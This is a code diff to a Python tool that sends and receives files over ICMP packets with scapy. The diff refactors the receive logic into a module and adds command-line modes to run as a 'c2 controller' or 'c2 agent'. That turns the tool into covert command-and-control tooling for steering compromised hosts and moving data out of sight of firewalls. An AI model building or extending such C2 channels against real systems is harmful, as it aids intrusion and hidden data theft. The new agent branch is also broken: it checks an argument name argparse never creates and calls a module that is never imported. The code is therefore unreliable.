@@ -2,38 +2,10 @@ import argparse
 import sys
 
 from lib.icmp_send import icmpSend
-from lib.icmp_receive import icmpRecv
-from lib.icmp_common import control_identifier
+import lib.icmp_receive as icmp_receive
+import lib.icmp_c2_controller as icmp_c2_controller
 
 from scapy.all import sniff, IP, ICMP
-
-connection_table = {}
-
-
-def process_incoming_packets(pkt):
-
-    sender_ip = pkt[IP].src
-    sequence = pkt[ICMP].seq
-    identifier = pkt[ICMP].id
-
-    # handle existing connections
-    if sender_ip in connection_table:
-        if identifier != control_identifier:
-            connection_table[sender_ip].receive_data(identifier, sequence)
-        else:
-            connection_table[sender_ip].handle_control_codes(sequence)
-
-    # handle new connections
-    elif identifier == control_identifier:
-        connection_table[sender_ip] = icmpRecv(sender_ip, sequence)
-        print(f"new transmission from {sender_ip}")
-    else:
-        print("unhandled ICMP packet received, ignoring")
-
-
-def listen():
-
-    sniff(filter="icmp[icmptype] != icmp-echo", prn=process_incoming_packets)
 
 
 def parseargs() -> argparse.Namespace:
@@ -43,6 +15,10 @@ def parseargs() -> argparse.Namespace:
     group = parser.add_mutually_exclusive_group(required=True)
     group.add_argument("-s", "--send", action="store_true", help="send a file")
     group.add_argument("-r", "--receive", action="store_true", help="receive files")
+    group.add_argument(
+        "-c", "--controller", action="store_true", help="run as a c2 controller"
+    )
+    group.add_argument("-a", "--agent", action="store_true", help="run as a c2 agent")
     parser.add_argument(
         "--dip",
         action="store",
@@ -64,7 +40,11 @@ def main(args: argparse.Namespace):
     if args.send:
         icmpSend(args.dip, args.file).start()
     elif args.receive:
-        listen()
+        icmp_receive.listen()
+    elif args.controller:
+        icmp_c2_controller.start()
+    elif args.icmp_c2_agent:
+        icmp_c2_agent.start()
 
 
 main(parseargs())
